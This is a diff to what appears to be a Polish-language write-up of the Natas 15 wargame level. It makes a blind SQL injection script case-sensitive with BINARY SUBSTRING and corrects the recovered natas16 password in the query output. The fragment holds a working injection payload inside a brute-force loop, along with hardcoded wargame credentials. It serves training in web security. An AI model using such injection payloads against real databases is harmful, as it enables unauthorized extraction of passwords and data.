@@ -75,7 +75,7 @@ auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
 
 for i in range (1, 33):
       for char in all_chars:
-            payload = f'natas16" and SUBSTRING(password, {i}, 1) = "{char}" #'
+            payload = f'natas16" and BINARY SUBSTRING(password, {i}, 1) = "{char}" #'
             data = {
                   "username": payload
             }
@@ -90,5 +90,5 @@ Hasło to : hpkjkyvilqctew33qmuxl6edvfmw4sgo
 
 Sprawdzenie
 ```
-Executing query: SELECT * from users where username="natas16" and password="hpkjkyvilqctew33qmuxl6edvfmw4sgo" #"<br>This user exists.<br>
+Executing query: SELECT * from users where username="natas16" and password="hPkjKYviLQctEW33QmuXL6eDVfMW4sGo" #"<br>This user exists.<br>
 ```
